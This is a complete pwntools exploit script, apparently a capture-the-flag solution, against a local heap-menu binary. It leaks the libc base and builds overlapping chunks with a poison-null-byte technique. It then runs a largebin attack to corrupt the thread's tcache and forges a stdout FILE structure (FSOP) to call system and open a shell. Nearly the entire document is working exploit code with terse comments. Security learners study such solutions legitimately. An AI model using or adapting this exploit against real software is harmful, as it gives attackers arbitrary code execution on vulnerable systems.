#!/usr/bin/env python3

from pwn import *

# PLEASE DEBUG

exe = ELF('./pwn_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def alloc(idx, size, data, desc):
	sla(b"> ", b"1")
	sla(b"Index: ", f"{idx}".encode())
	sla(b"Size: ", f"{size}".encode())
	sa(b"Data: ", data)
	sa(b"Description: ", desc)

def free(idx):
	sla(b"> ", b"2")
	sla(b"Index: ", f"{idx}".encode())	

script = '''
# scanf choice
brva 0x12C1
'''

p = process('./pwn_patched')
#p = gdb.debug('./pwn_patched', gdbscript = script)

# free leak libc
sla(b"> ", b"1337")
rcu(b"real one\n")
libc_base = u64(p.recv(8)) - libc.symbols['puts']
lleak("libc_base", libc_base)

# super duper heap fengshui
alloc(0, 0x418, b"0", b"0")
alloc(1, 0x28, b"1", b"1")
alloc(2, 0x418, b"2", b"2")
alloc(3, 0x458, b"3", b"3")
alloc(7, 0x4f8, b"7", b"7") # victim chunk (the chunk will be poison null byte)
alloc(4, 0x28, b"4", b"4")
alloc(5, 0x418, b"5", b"5")
alloc(6, 0x418, b"6", b"6")
alloc(8, 0x28, b"8", b"8")

# free oder is important, we need to keep 2 bk and fd pointer at chunk[3] (WE DONT HAVE HEAP LEAK)
free(0)
free(3)
free(6)
free(2)

# this also important, to keep double linked list not corrupted
alloc(0, 0x418, b"0", b"0")
alloc(6, 0x418, b"5", b"5")
alloc(2, 0x448, b"2", b"2") # the chunk we consolidated to will be inside this chunk (at near the end) (conso)
alloc(3, 0x428, b"3", b"3")

# make conso->fd->bk point to conso
free(0)
free(3)
alloc(0, 0x418, b"0" * 8 + p8(0), b"0") # partial overwrite
alloc(3, 0x428, b"3", b"3")

# make conso->bk->fd point to conso
## due to how doubly link list work, we have to do this way
free(3)
free(6)
free(5)
alloc(5, 0x838, b"5", b"5" * 0x3f8 + p64(0x421) + p8(0)) # partial overwrite
alloc(3, 0x428, b"3", b"3")

# poison null byte and free victim chunk, make it consolidate to conso chunk
free(3)
alloc(42, 0x428, b"X" * 8, b"X" * 0x400 + p64(0x460))
free(7)
# done overlapping chunk

# largebin attack, aim for tcache in TLS
## another supder duper fenghsui due to heap layout
stdout = libc_base + libc.symbols['_IO_2_1_stdout_'] - 0x20
alloc(9, 0x428, b"9", b"9")
alloc(10, 0x28, b"A", b"A")
alloc(11, 0x418, b"B", p16(1) * 0x30 + p64(stdout) * 0x40) # prepare fake tcache_per_thread
alloc(12, 0x28, b"C", b"C")

free(9)
alloc(13, 0x438, b"D", b"D")
free(2)
free(11)

tcache = libc_base - 0x2908
payload = b"2" * 0x3f8 + p64(0x431) + p64(libc_base + 0x1d30b0) * 2 + p64(0) + p64(tcache - 0x20)
alloc(2, 0x448, b"2", payload)
alloc(14, 0x438, b"E", b"E")
# now tcache is full of stdout (shift back a little)

# malloc to stdout, fsop
_IO_2_1_stdout_ = libc_base + libc.symbols['_IO_2_1_stdout_']
system = libc_base + libc.symbols['system']
fp = FileStructure(0)
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = system
fp._lock = _IO_2_1_stdout_ + 0x50
fp._wide_data = _IO_2_1_stdout_ - 0x10
fp.unknown2 =  p64(0) * 3 + p64(0xffffffff) + p64(0) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)
fp.vtable = libc_base  + libc.symbols['_IO_wfile_jumps'] - 0x20
payload = bytes(fp)
alloc(15, 0x150, b"F", payload)

# trigger stdout -> shell
sla(b"> ", b"1337")

#debug()

p.interactive()
